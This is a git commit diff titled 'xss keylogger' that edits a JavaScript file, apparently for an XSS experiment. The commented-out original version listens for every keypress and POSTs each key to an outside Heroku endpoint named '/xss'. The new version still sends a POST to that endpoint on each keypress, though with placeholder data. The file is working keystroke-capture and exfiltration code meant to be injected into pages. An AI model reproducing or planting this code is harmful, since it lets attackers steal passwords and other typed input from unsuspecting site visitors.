f0198f61585ec379a3a5de7951fb3156f6b9bcee
Duy Nguyen <duy210697@gmail.com>
2019-03-03 03:21:12 +0700

    2019-03-03: xss keylogger

--- public/js/keylogger.js
+++ public/js/keylogger.js
@@ -1,27 +1,43 @@
+//
+// function ajaxRequest (method, url, data) {
+//     var xmlHttp = new XMLHttpRequest()
+//
+//     xmlHttp.onreadystatechange = function() {
+//         if (this.readyState == 4 && this.status == 200) {
+//             console.log(this.responseText);
+//         }
+//     };
+//
+//     if (xmlHttp.overrideMimeType) {
+//         xmlHttp.overrideMimeType('application/json')
+//     }
+//
+//     xmlHttp.open(method, url, true)
+//     // xmlHttp.setRequestHeader('Content-Type', 'application/json');
+//
+//     xmlHttp.setRequestHeader("*", "application/json");
+//     // xmlHttp.setRequestHeader('Access-Control-Allow-Headers', '*');
+//     // xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
+//     xmlHttp.send(data)
+//     return xmlHttp
+// }
+//
+// document.addEventListener('keypress', function (e) {
+//     ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', '{"key":' + e.key + '}')
+// })
 
-function ajaxRequest (method, url, data) {
-    var xmlHttp = new XMLHttpRequest()
-
-    xmlHttp.onreadystatechange = function() {
+function loadDoc() {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
         if (this.readyState == 4 && this.status == 200) {
-            console.log(this.responseText);
+            console.log('here')
         }
     };
-
-    if (xmlHttp.overrideMimeType) {
-        xmlHttp.overrideMimeType('application/json')
-    }
-
-    xmlHttp.open(method, url, true)
-    // xmlHttp.setRequestHeader('Content-Type', 'application/json');
-
-    xmlHttp.setRequestHeader("*", "application/json");
-    // xmlHttp.setRequestHeader('Access-Control-Allow-Headers', '*');
-    // xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xmlHttp.send(data)
-    return xmlHttp
+    xhttp.open("POST", "http://blog-torf.herokuapp.com/xss", true);
+    xhttp.setRequestHeader("Content-type", "application/json");
+    xhttp.send("fname=Henry&lname=Ford");
 }
 
 document.addEventListener('keypress', function (e) {
-    ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', '{"key":' + e.key + '}')
+    loadDoc();
 })
